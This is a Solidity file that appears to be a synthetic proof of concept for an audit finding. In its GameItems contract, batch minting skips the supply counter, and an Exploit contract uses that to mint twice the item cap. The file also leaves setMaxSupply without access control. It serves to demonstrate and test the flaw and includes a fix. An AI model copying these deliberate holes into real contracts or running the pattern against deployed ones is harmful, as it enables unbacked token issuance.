// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gigaverse GameItems — mintBatch / burnBatch skip the supply counters
    (Pashov Audit Group, finding #53284)
    SYNTHETIC, cheatcode-free. mintBatch calls _mintBatch and does not
    write MINT_COUNT_CID. The single-mint path reads that counter against
    maxSupply, so a later mint treats the batch as if it never happened
    and issues another full cap. */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }
}

contract GameItems {
    uint256 public constant MINT_COUNT_CID = 1;
    uint256 public constant BURN_COUNT_CID = 2;
    address public minter;
    bool public paused;

    mapping(uint256 => uint256) public maxSupply;
    mapping(uint256 => mapping(uint256 => uint256)) public docs;
    mapping(uint256 => mapping(address => uint256)) public balanceOf;
    MockToken public item;

    error NotEnoughSupply(uint256 needed, uint256 maxSupply);
    error NotMinter();
    error Paused();

    constructor(address minter_, MockToken item_) {
        minter = minter_;
        item = item_;
    }

    modifier onlyMinter() {
        if (msg.sender != minter) revert NotMinter();
        _;
    }

    modifier whenNotPaused() {
        if (paused) revert Paused();
        _;
    }

    function setMaxSupply(uint256 id, uint256 cap) external {
        maxSupply[id] = cap;
    }

    function minted(uint256 id) external view returns (uint256) {
        return docs[id][MINT_COUNT_CID];
    }

    function burned(uint256 id) external view returns (uint256) {
        return docs[id][BURN_COUNT_CID];
    }

    function mint(address to, uint256 id, uint256 amount) external onlyMinter whenNotPaused {
        _safeMint(to, id, amount);
    }

    function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data)
        external
        onlyMinter
        whenNotPaused
    {
        _mintBatch(to, ids, amounts, data);
    }

    function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts) external onlyMinter whenNotPaused {
        _mintBatch(to, ids, amounts, "");
    }

    function burnBatch(address from, uint256[] memory ids, uint256[] memory amounts) external onlyMinter whenNotPaused {
        _burnBatch(from, ids, amounts);
    }

    function _safeMint(address to, uint256 id, uint256 amount) internal {
        uint256 mints = docs[id][MINT_COUNT_CID];
        uint256 needed = mints + amount;
        uint256 cap = maxSupply[id];
        if (needed > cap) revert NotEnoughSupply(needed, cap);
        docs[id][MINT_COUNT_CID] = needed;
        _credit(to, id, amount);
    }

    function _mintBatch(address to, uint256[] memory ids, uint256[] memory amounts, bytes memory) internal {
        for (uint256 i = 0; i < ids.length; ++i) {
            // @> VULN: batch mint credits balances but never writes MINT_COUNT_CID
            _credit(to, ids[i], amounts[i]);
            // FIX: docs[ids[i]][MINT_COUNT_CID] += amounts[i];
        }
    }

    function mintBatchFixed(address to, uint256[] memory ids, uint256[] memory amounts) external onlyMinter whenNotPaused {
        for (uint256 i = 0; i < ids.length; ++i) {
            uint256 needed = docs[ids[i]][MINT_COUNT_CID] + amounts[i];
            uint256 cap = maxSupply[ids[i]];
            if (needed > cap) revert NotEnoughSupply(needed, cap);
            docs[ids[i]][MINT_COUNT_CID] = needed;
            _credit(to, ids[i], amounts[i]);
        }
    }

    function _burnBatch(address from, uint256[] memory ids, uint256[] memory amounts) internal {
        for (uint256 i = 0; i < ids.length; ++i) {
            balanceOf[ids[i]][from] -= amounts[i];
            // BURN_COUNT_CID is intentionally not updated, matching the finding.
        }
    }

    function _credit(address to, uint256 id, uint256 amount) internal {
        balanceOf[id][to] += amount;
        item.mint(to, amount);
    }
}

contract Exploit {
    MockToken public item; // CREATE nonce 1
    GameItems public items; // CREATE nonce 2
    uint256 public constant ID = 1;
    uint256 public constant CAP = 10;
    uint256 public staleCount;

    constructor() {
        item = new MockToken("ITEM", "ITEM", 0);
        items = new GameItems(address(this), item);
        items.setMaxSupply(ID, CAP);
    }

    function run() external {
        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        ids[0] = ID;
        amounts[0] = CAP;
        items.mintBatch(address(this), ids, amounts);
        staleCount = items.minted(ID);
        items.mint(address(this), ID, CAP);
        uint256 held = items.balanceOf(ID, address(this));
        uint256 counted = items.minted(ID);
        uint256 tokens = item.balanceOf(address(this));
        require(staleCount == 0, "batch did not leave the counter at 0");
        require(held == CAP * 2, "20 items against a cap of 10");
        require(counted == CAP, "only the later mint was counted");
        require(tokens == CAP * 2, "20 item tokens");
        require(held > items.maxSupply(ID), "over cap");
    }
}
